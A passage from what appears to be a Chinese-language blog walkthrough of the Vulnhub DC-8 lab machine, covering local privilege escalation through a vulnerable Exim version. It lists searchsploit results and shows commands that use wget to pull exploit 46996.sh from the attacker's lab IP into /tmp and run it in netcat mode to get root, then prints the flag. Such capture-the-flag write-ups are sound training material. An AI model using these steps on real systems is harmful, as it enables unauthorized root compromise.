/var/lib/exim4/config.autogenerated\n</code></pre>\n</li>\n<li>\n<p>搜索漏洞</p>\n<pre><code class=\"hljs language-python\">searchsploit Exim     \n--------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                             |  Path\n--------------------------------------------------------------------------- ---------------------------------\nDovecot <span class=\"hljs-keyword\">with</span> Exim - <span class=\"hljs-string\">'sender_address'</span> Remote Command Execution              | linux/remote/<span class=\"hljs-number\">25297.</span>txt\nExim - <span class=\"hljs-string\">'GHOST'</span> glibc gethostbyname Buffer Overflow (Metasploit)            | linux/remote/<span class=\"hljs-number\">36421.</span>rb\nExim - <span class=\"hljs-string\">'perl_startup'</span> Local Privilege Escalation (Metasploit)              | linux/local/<span class=\"hljs-number\">39702.</span>rb\nExim - <span class=\"hljs-string\">'sender_address'</span> Remote Code Execution                              | linux/remote/<span class=\"hljs-number\">25970.</span>py\nExim <span class=\"hljs-number\">3.</span>x - Format String                                                   | linux/local/<span class=\"hljs-number\">20900.</span>txt\nExim <span class=\"hljs-number\">4</span> (Debian <span class=\"hljs-number\">8</span> / Ubuntu <span class=\"hljs-number\">16.04</span>) - Spool Privilege Escalation              | linux/local/<span class=\"hljs-number\">40054.</span>c\nExim <span class=\"hljs-number\">4.41</span> - <span class=\"hljs-string\">'dns_build_reverse'</span> Local Buffer Overflow                      | linux/local/<span class=\"hljs-number\">756.</span>c\nExim <span class=\"hljs-number\">4.41</span> - <span class=\"hljs-string\">'dns_build_reverse'</span> Local Read Emails                          | linux/local/<span class=\"hljs-number\">1009.</span>c\nExim <span class=\"hljs-number\">4.42</span> - Local Privilege Escalation                                     | linux/local/<span class=\"hljs-number\">796.</span>sh\nExim <span class=\"hljs-number\">4.43</span> - <span class=\"hljs-string\">'auth_spa_server()'</span> Remote                                     | linux/remote/<span class=\"hljs-number\">812.</span>c\nExim <span class=\"hljs-number\">4.63</span> - Remote Command Execution                                       | linux/remote/<span class=\"hljs-number\">15725.</span>pl\nExim <span class=\"hljs-number\">4.84</span>-<span class=\"hljs-number\">3</span> - Local Privilege Escalation                                   | linux/local/<span class=\"hljs-number\">39535.</span>sh\nExim <span class=\"hljs-number\">4.87</span> - <span class=\"hljs-number\">4.91</span> - Local Privilege Escalation                              | linux/local/<span class=\"hljs-number\">46996.</span>sh\nExim <span class=\"hljs-number\">4.87</span> / <span class=\"hljs-number\">4.91</span> - Local Privilege Escalation (Metasploit)                 | linux/local/<span class=\"hljs-number\">47307.</span>rb\nExim <span class=\"hljs-number\">4.87</span> &#x3C; <span class=\"hljs-number\">4.91</span> - (Local / Remote) Command Execution                      | linux/remote/<span class=\"hljs-number\">46974.</span>txt\nExim <span class=\"hljs-number\">4.89</span> - <span class=\"hljs-string\">'BDAT'</span> Denial of Service                                       | multiple/dos/<span class=\"hljs-number\">43184.</span>txt\nexim <span class=\"hljs-number\">4.90</span> - Remote Code Execution                                          | linux/remote/<span class=\"hljs-number\">45671.</span>py\nExim &#x3C; <span class=\"hljs-number\">4.86</span><span class=\"hljs-number\">.2</span> - Local Privilege Escalation                                 | linux/local/<span class=\"hljs-number\">39549.</span>txt\nExim &#x3C; <span class=\"hljs-number\">4.90</span><span class=\"hljs-number\">.1</span> - <span class=\"hljs-string\">'base64d'</span> Remote Code Execution                            | linux/remote/<span class=\"hljs-number\">44571.</span>py\nExim Buffer <span class=\"hljs-number\">1.6</span><span class=\"hljs-number\">.2</span>/<span class=\"hljs-number\">1.6</span><span class=\"hljs-number\">.51</span> - Local Overflow                                  | unix/local/<span class=\"hljs-number\">20333.</span>c\nExim ESMTP <span class=\"hljs-number\">4.80</span> - glibc gethostbyname Denial of Service                    | linux/dos/<span class=\"hljs-number\">35951.</span>py\nExim Internet Mailer <span class=\"hljs-number\">3.35</span>/<span class=\"hljs-number\">3.36</span>/<span class=\"hljs-number\">4.10</span> - Format String                        | linux/local/<span class=\"hljs-number\">22066.</span>c\nExim Sender <span class=\"hljs-number\">3.35</span> - Verification Remote Stack Buffer Overrun                | linux/remote/<span class=\"hljs-number\">24093.</span>c\nExim4 &#x3C; <span class=\"hljs-number\">4.69</span> - string_format Function Heap Buffer Overflow (Metasploit)    | linux/remote/<span class=\"hljs-number\">16925.</span>rb\nPHPMailer &#x3C; <span class=\"hljs-number\">5.2</span><span class=\"hljs-number\">.20</span> <span class=\"hljs-keyword\">with</span> Exim MTA - Remote Code Execution                   | php/webapps/<span class=\"hljs-number\">42221.</span>py\n--------------------------------------------------------------------------- ---------------------------------\n</code></pre>\n<p>可以看到 <code>46996.sh</code> 是比较合适的，我们将它拉取下来，然后下载到靶机</p>\n</li>\n<li>\n<p>查看脚本内容，看食用方法</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># Usage (netcat method):</span>\n<span class=\"hljs-comment\"># $ id</span>\n<span class=\"hljs-comment\"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span>\n<span class=\"hljs-comment\"># $ ./raptor_exim_wiz -m netcat</span>\n</code></pre>\n</li>\n<li>\n<p>将文件放到<code>/tmp</code>目录下，给予文件执行权限</p>\n<pre><code class=\"hljs language-python\">cd /tmp\nwget <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>/<span class=\"hljs-number\">46996.</span>sh\nchmod u+x <span class=\"hljs-number\">46996.</span>sh\n</code></pre>\n<p>根据食用方法执行文件</p>\n<pre><code class=\"hljs language-python\">./<span class=\"hljs-number\">46996.</span>sh -m netcat\n</code></pre>\n</li>\n<li>\n<p>提权成功</p>\n<pre><code class=\"hljs language-python\">whoami\nroot\n</code></pre>\n</li>\n<li>\n<p>读取<code>flag</code>内容</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># cat flag.txt</span>\n//\nBrilliant - you have succeeded!!!\n\n<span class=\"hljs-number\">888</span>       <span class=\"hljs-number\">888</span>          <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      8888888b.                             <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>\n<span class=\"hljs-number\">888</span>   o   <span class=\"hljs-number\">888</span>          <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>  <span class=\"hljs-string\">\"Y88b                            888 888 888 888\n888  d8b  888          888 888      888    888                            888 888 888 888\n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888\n888d88888b888 d8P  Y8b 888 888      888    888 d88\"</span><span class=\"hljs-string\">\"88b 888 \"</span>88b d8P  Y8b <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>\n88888P Y88888 <span class=\"hljs-number\">88888888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>    <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">88888888</span> Y8P Y8P Y8P Y8P\n8888P   Y8888 Y8b.     <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>  .d88P Y88.<span class=\"hljs-number\">.88</span>P <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> Y8b.      <span class=\"hljs-string\">\"   \"</span>   <span class=\"hljs-string\">\"   \"</span>\n888P     Y888  <span class=\"hljs-string\">\"Y8888  888 888      8888888P\"</span>   <span class=\"hljs-string\">\"Y88P\"</span>  <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span>  <span class=\"hljs-string\">\"Y8888  888 888 888 888\n\nHope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and all those who have taken the time to complete these little\nchallenges.\n\nI'm also sending out an especially big thanks to:\n\n@4nqr34z\n@D4mianWayne\n@0xmzfr\n@theart42\n\nThis challenge was largely based on two things:\n\n1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.\n2. A suggestion from @theart42\n\nThe answer to that question is...\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n\n</span></code></pre>\n</li>\n</ul>\n</li>\n</ol>","title":"Vulnhub - DC-8","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC-8\n\n https://www.vulnhub.com/entry/dc-8,367/\n \n\n描述：在 Linux 上安装和配置双因素身份验证是否可以防止 Linux 服务器被利用\n\n端口扫描主机发现\n\n1. 探测存活主机，`179`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4..."},"recentPosts":[{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"}]},"__N_SSG":true}